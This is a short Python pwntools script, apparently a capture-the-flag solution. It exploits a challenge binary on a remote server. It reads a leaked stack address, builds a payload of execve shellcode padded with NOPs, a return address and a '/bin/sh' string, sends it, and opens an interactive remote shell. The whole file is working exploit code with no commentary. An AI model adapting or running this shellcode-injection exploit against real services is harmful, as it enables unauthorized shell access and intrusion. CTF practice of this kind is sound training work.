#!/usr/bin/python3

from pwn import *

def create_payload(stack_leak, shellcode):
    buffer = stack_leak - 0x4
    log.info("Buffer: %#x", buffer)

    payload = shellcode.ljust(0x10, b"\x90")  # Append NOPs to make the shellcode 16 bytes
    payload += p64(buffer)  # Add buffer address
    payload += b"/bin/sh\x00"  # Add null-terminated "/bin/sh" string

    return payload

def exploit_program():
    elf = context.binary = ELF("chall")

    connection = remote("ctf99.cs.ui.ac.id", 10013)
    connection.recvuntil(b"address for you: ")

    stack_leak = int(connection.recvline().strip(), 16)
    log.info("Stack leak: %#x", stack_leak)

    shellcode = asm(
                    """
                    mov rdi, rsp
                    mov sil, 0
                    mov al, 0x3b
                    syscall
                    """
                )

    payload = create_payload(stack_leak, shellcode)
    connection.sendline(payload)

    connection.interactive()

if __name__ == "__main__":
    exploit_program()
